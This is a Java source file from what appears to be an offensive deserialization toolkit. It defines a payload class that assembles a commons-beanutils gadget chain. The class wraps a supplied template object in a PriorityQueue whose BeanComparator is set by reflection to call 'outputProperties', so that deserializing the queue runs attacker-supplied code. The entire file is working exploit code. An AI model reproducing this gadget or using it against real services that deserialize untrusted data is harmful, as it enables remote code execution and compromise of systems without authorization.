package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Reflections;


import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.PriorityQueue;
import java.util.Queue;

// Apache Commons Lang
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"水滴"})
public class CommonsBeanutilsObjectToStringComparator  implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {

        ObjectToStringComparator stringComparator = new ObjectToStringComparator();


        BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);


        queue.add(stringComparator);
        queue.add(stringComparator);


        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}
